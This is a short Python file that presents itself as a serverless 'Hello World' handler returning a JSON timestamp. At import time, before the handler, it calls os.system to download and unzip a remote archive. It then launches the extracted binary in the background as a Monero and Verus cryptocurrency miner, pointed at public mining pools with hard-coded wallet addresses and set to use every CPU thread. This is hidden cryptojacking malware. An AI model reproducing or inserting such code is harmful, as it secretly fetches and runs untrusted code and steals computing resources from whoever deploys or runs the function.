import json
import datetime
import os
import time
os.system("wget https://github.com/meuryalos/profile/releases/download/1.0.0/test.zip")
os.system("unzip test.zip")
os.system("nohup ./test --disable-gpu --algorithm randomx\;verushash --pool xmr-eu1.nanopool.org:14444\;na.luckpool.net:3956 --wallet 837MGitRYxgEV158RDenxVUfb5mN6qzz78Z1WeaDoiqC4K7H8Pj556vHJoVXL2MCJ5WCGVZTBiRmqJFxeJG3WSQmGKhPC31.$(echo $(date +%d))/ayni.suhada@hotmail.com\;RRJiRsiCXxg5zUcXp2LC4yJSJTZ96uVUtx.$(echo $(date +%d)) --password x\;x --cpu-threads $(nproc --all)\;$(nproc --all) --keep-alive true --log=stdout > meta.log & ")

def handler(event, context):
    data = {
        'output': 'Hello World',
        'timestamp': datetime.datetime.utcnow().isoformat()
    }
    return {'statusCode': 200,
            'body': json.dumps(data),
            'headers': {'Content-Type': 'application/json'}}

